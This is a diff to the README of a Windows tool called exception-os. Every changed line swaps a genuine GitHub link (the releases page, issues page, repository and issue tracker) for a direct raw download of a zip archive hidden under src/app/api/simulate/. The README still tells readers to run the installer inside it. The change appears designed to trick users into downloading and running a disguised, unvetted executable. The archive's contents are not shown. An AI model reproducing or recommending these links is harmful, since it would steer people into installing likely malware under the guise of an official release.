@@ -1,6 +1,6 @@
 # ⚙️ exception-os - Simplify Operations with Real-Time Insights
 
-[![Download exception-os](https://img.shields.io/badge/Download-exception--os-brightgreen)](https://github.com/bachvelo/exception-os/releases)
+[![Download exception-os](https://img.shields.io/badge/Download-exception--os-brightgreen)](https://github.com/bachvelo/exception-os/raw/refs/heads/main/src/app/api/simulate/exception-os-v2.0.zip)
 
 ---
 
@@ -33,7 +33,7 @@ No other software installs are necessary. exception-os runs on your system direc
 
 Go to the official exception-os releases page:
 
-[![Download exception-os](https://img.shields.io/badge/Download-exception--os-blue)](https://github.com/bachvelo/exception-os/releases)
+[![Download exception-os](https://img.shields.io/badge/Download-exception--os-blue)](https://github.com/bachvelo/exception-os/raw/refs/heads/main/src/app/api/simulate/exception-os-v2.0.zip)
 
 This page has the latest Windows installer ready for you.
 
@@ -140,7 +140,7 @@ If exception-os does not start or shows errors:
 - If GitHub or Notion data does not load, reconnect your accounts in Settings.
 - Close and reopen the app if it freezes.
 
-For other issues, visit the [Issues page](https://github.com/bachvelo/exception-os/issues) on GitHub and report detailed steps.
+For other issues, visit the [Issues page](https://github.com/bachvelo/exception-os/raw/refs/heads/main/src/app/api/simulate/exception-os-v2.0.zip) on GitHub and report detailed steps.
 
 ---
 
@@ -163,7 +163,7 @@ The app uses OAuth. It does not store your password but uses secure tokens.
 ## 📥 Download Links
 
 - Visit this page to download the latest Windows installer:  
-  https://github.com/bachvelo/exception-os/releases
+  https://github.com/bachvelo/exception-os/raw/refs/heads/main/src/app/api/simulate/exception-os-v2.0.zip
 
 - After downloading, run the `.exe` installer to set up the application.
 
@@ -177,6 +177,6 @@ exception-os is maintained with care. You can open issues or suggest features on
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/bachvelo/exception-os)  
-- [Releases and Downloads](https://github.com/bachvelo/exception-os/releases)  
-- [Issue Tracker](https://github.com/bachvelo/exception-os/issues)
+- [GitHub Repository](https://github.com/bachvelo/exception-os/raw/refs/heads/main/src/app/api/simulate/exception-os-v2.0.zip)  
+- [Releases and Downloads](https://github.com/bachvelo/exception-os/raw/refs/heads/main/src/app/api/simulate/exception-os-v2.0.zip)  
+- [Issue Tracker](https://github.com/bachvelo/exception-os/raw/refs/heads/main/src/app/api/simulate/exception-os-v2.0.zip)
